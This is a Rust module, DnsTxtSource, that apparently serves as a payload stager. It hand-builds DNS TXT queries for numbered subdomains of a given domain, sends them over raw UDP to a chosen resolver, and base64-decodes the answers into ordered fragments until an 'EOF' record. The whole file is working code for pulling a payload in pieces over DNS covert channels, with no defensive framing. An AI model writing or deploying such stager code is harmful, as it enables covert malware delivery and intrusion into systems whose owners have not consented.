use crate::fragments::{Fragment, FragmentSource};
use core::time::Duration;
use std::net::UdpSocket;

/// A payload FragmentSource that reads data from DNS TXT records.
/// No external dependencies: constructs raw DNS queries and parses responses directly.
pub struct DnsTxtSource {
    pub domain: String,
    pub resolver: String,
}

impl DnsTxtSource {
    pub fn new(domain: &str, resolver: &str) -> Self {
        DnsTxtSource {
            domain: domain.to_string(),
            resolver: resolver.to_string(),
        }
    }

    /// Very minimal Base64 decoding logic (Zero deps)
    fn decode_b64(&self, b64: &[u8]) -> Vec<u8> {
        let mut out = Vec::with_capacity((b64.len() * 3) / 4);
        let mut val = 0u32;
        let mut bits = 0;
        
        for &b in b64 {
            let n = match b {
                b'A'..=b'Z' => b - b'A',
                b'a'..=b'z' => b - b'a' + 26,
                b'0'..=b'9' => b - b'0' + 52,
                b'+' => 62,
                b'/' => 63,
                b'=' => {
                    bits -= 2;
                    continue;
                }
                _ => continue, // ignore whitespace / quotes
            };
            val = (val << 6) | (n as u32);
            bits += 6;
            if bits >= 8 {
                bits -= 8;
                out.push((val >> bits) as u8);
            }
        }
        out
    }

    /// Forms a raw DNS query packet for N.domain (e.g., "0.payload.test.local").
    fn build_dns_query(&self, tx_id: u16, seq: u16) -> Vec<u8> {
        let mut packet = Vec::with_capacity(512);
        
        // 12-byte DNS Header
        packet.extend_from_slice(&tx_id.to_be_bytes()); // Transaction ID
        packet.extend_from_slice(&[0x01, 0x00]);        // Flags: Standard query
        packet.extend_from_slice(&[0x00, 0x01]);        // Questions: 1
        packet.extend_from_slice(&[0x00, 0x00]);        // Answer RRs: 0
        packet.extend_from_slice(&[0x00, 0x00]);        // Authority RRs: 0
        packet.extend_from_slice(&[0x00, 0x00]);        // Additional RRs: 0

        // Parse: "<seq>.domain.com"
        let seq_str = format!("{}", seq);
        packet.push(seq_str.len() as u8);
        packet.extend_from_slice(seq_str.as_bytes());

        for part in self.domain.split('.') {
            let len = part.len() as u8;
            packet.push(len);
            packet.extend_from_slice(part.as_bytes());
        }
        packet.push(0x00); // End of QNAME

        packet.extend_from_slice(&[0x00, 0x10]); // QTYPE: TXT (16)
        packet.extend_from_slice(&[0x00, 0x01]); // QCLASS: IN (1)

        packet
    }

    fn parse_dns_response(&self, buf: &[u8]) -> Option<Vec<u8>> {
        if buf.len() < 12 { return None; }

        let flags = u16::from_be_bytes([buf[2], buf[3]]);
        if (flags & 0x8000) == 0 || (flags & 0x000F) != 0 { return None; }

        let qdcount = u16::from_be_bytes([buf[4], buf[5]]);
        let ancount = u16::from_be_bytes([buf[6], buf[7]]);
        if ancount == 0 { return None; }

        let mut offset = 12;
        for _ in 0..qdcount {
            while offset < buf.len() && buf[offset] != 0 {
                if buf[offset] >= 192 { offset += 2; break; }
                else { offset += (buf[offset] as usize) + 1; }
            }
            if offset < buf.len() && buf[offset] == 0 { offset += 1; }
            offset += 4;
        }

        for _ in 0..ancount {
            if offset >= buf.len() { break; }

            if buf[offset] >= 192 { offset += 2; }
            else {
                while offset < buf.len() && buf[offset] != 0 { offset += (buf[offset] as usize) + 1; }
                offset += 1;
            }

            if offset + 10 > buf.len() { break; }
            let rtype = u16::from_be_bytes([buf[offset], buf[offset+1]]);
            let rdlength = u16::from_be_bytes([buf[offset+8], buf[offset+9]]) as usize;
            offset += 10;

            if rtype == 16 { 
                if offset + rdlength > buf.len() { break; }
                let txt_len = buf[offset] as usize;
                if offset + 1 + txt_len <= buf.len() {
                    let txt_data = &buf[offset+1 .. offset+1+txt_len];
                    
                    // The magic EOF marker
                    if txt_data == b"EOF" || txt_data == b"\"EOF\"" {
                        return Some(b"EOF".to_vec());
                    }

                    // Decode Base64 chunk
                    return Some(self.decode_b64(txt_data));
                }
            } else {
                offset += rdlength;
            }
        }
        None
    }
}

impl DnsTxtSource {
    pub fn fetch_seq(&self, seq: u16) -> Option<Fragment> {
        let sock = match UdpSocket::bind("0.0.0.0:0") {
            Ok(s) => s,
            Err(_) => return None,
        };
        let _ = sock.set_read_timeout(Some(Duration::from_millis(1500)));

        let query = self.build_dns_query(0x1234, seq);
        if sock.send_to(&query, &self.resolver).is_err() {
            return None;
        }

        let mut buf = [0u8; 512];
        if let Ok((size, _)) = sock.recv_from(&mut buf) {
             if let Some(payload_bytes) = self.parse_dns_response(&buf[..size]) {
                 if payload_bytes == b"EOF" {
                     return None; // EOF signal
                 }
                 return Some(Fragment {
                     sequence_id: (seq % 256) as u8,
                     data: payload_bytes,
                 });
             }
        }
        None // Timeout or error
    }
}
